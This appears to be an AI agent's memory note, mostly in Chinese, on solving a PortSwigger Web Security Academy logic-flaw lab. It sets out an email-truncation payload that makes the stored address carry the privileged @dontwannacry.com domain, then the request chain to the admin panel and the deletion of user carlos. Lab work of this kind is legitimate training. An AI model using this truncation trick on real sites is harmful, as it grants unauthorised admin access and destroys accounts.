---
metadata:
  node_type: memory
name: "lab-logic-flaws-inconsistent-handling-of-exceptional-input"
description: "Arm A solve: 255-char email truncation stores @dontwannacry.com domain → admin panel → delete carlos; page_read/range_launch launch-url EOF bypassed via http_dump + widget-lab-id"
last_updated: 2026-10-10T02:59:50+08:00
created: 2026-10-10T02:59:50+08:00
---

2026-10-09 — lab-logic-flaws-inconsistent-handling-of-exceptional-input (arm A solve)

- Path: /web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input → widget-lab-id 2CFDDD3FAE848E161277E28CC5CC7782F2B4BAA2CBEFBD2A3DCE178FE656AD17.
- Transport defect: page_read 和 range_launch launch-url 取 portswigger.net 都报 "Network Error: Unexpected EOF";http_dump(ureq)完全正常 → 页面落盘 /tmp/lab-exc.html,text_grep 抽 widget-lab-id,range_launch launch <widget-lab-id> 起实例成功(18.9s)。围栏:同一 URL 换件即通,不要在同一件上重试。
- 实例 https://0a5100f3034834ee806653d800d10017.web-security-academy.net;邮箱客户端在 exploit-0ae3007103e53401800c527a018f00eb.exploit-server.net/email,地址 attacker@<exploit 域>,收 <域> 及其所有子域。
- 题面缺口:注册页明示 "If you work for DontWannaCry, please use your @dontwannacry.com email address",而 email 入库时被截断到 255 字符 —— 校验与存储不一致。
- 判定陷阱:POST /register 成功也返回 200(页面出现 "Please check your emails for your account registration link"),不是 302;200 不能读成失败,要看 body。用户名已存在时同样 200 且重渲染表单(wiener 已被占,wienerx 才成)。
- 载荷构造:email = 238 个 'a' + %40dontwannacry.com + .exploit-0ae3007103e53401800c527a018f00eb.exploit-server.net(315 字符),截断后 255 字符恰以 @dontwannacry.com 收尾 → 入库域即 dontwannacry.com,admin 判定放行。238 = 255 - len("@dontwannacry.com")。
- 工程点:填充串用 shell 生成(PAD=$(printf 'a%.0s' $(seq 1 238)))直接写进 reqseq spec(/tmp/reg-spec.json),避免手打 238 个字符出错;HTTP 全部走 reqseq/http_session,banner_verdict 收尾。
- 链路:inbox 取 temp-registration-token → GET /register?temp-registration-token=... → POST /login wienerx:peter(302 到 /my-account?id=wienerx,写回 jar)→ GET /admin 200 出用户表 → GET /admin/delete?username=carlos → 302 → banner solved=true。
- 复用点:长字段截断对齐(截断位置=目标后缀起点)+ 域后缀白名单,是"校验面与存储面长度不一致"族的通用形态;先算长度差再生成载荷,别猜。
